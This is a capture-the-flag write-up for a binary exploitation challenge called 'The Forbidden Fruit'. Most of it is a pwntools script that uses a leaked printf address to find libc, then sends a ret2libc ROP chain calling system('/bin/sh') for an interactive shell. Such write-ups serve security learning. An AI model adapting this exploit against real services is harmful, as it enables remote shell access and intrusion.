---
date: '2025-12-10T14:59:45+05:30'
title: 'The Forbidden Fruit'

challenge-categories:
- Binary Exploitation
- ROP
---

EZ PZ Rop FTW

<!--more-->

## Problem Statement

Go on Eve take a bite

`nc challenges2.perfectroot.wiki 1235`

## Approach

Good ol' ret2libc ROP.

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = "tmux neww -a".split()

exe = context.binary = ELF(args.EXE or "./chall_patched")
libc = ELF("/home/hknhmr/ctf/2025/perfectroot/pwn/forbidden-fruit/chall(4)-1/libc6.so")
assert libc is not None


def start(argv=[], *a, **kw):
    if args.REMOTE:
        # parse things of this format 83.136.254.84:36100
        addr, port = args.REMOTE.split(":")
        return remote(addr, int(port))
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = """
bp 0x000000000040120a
continue
""".format(**locals())

io = start()
sla = io.sendlineafter
sa = io.sendafter
sl = io.sendline
ru = io.recvuntil
rl = io.recvline

ru(b": ")
printf_addr = int(rl().strip(), 16)
libc.address = printf_addr - libc.sym["printf"]

rop = ROP(libc)
rop.raw(rop.ret)
rop.call("system", [next(libc.search(b"/bin/sh\x00"))])

info(rop.dump())
info("%#x" % libc.address)

io.flat({0x48: bytes(rop)})
io.flat(b"\n")

io.interactive()
```

## Flag



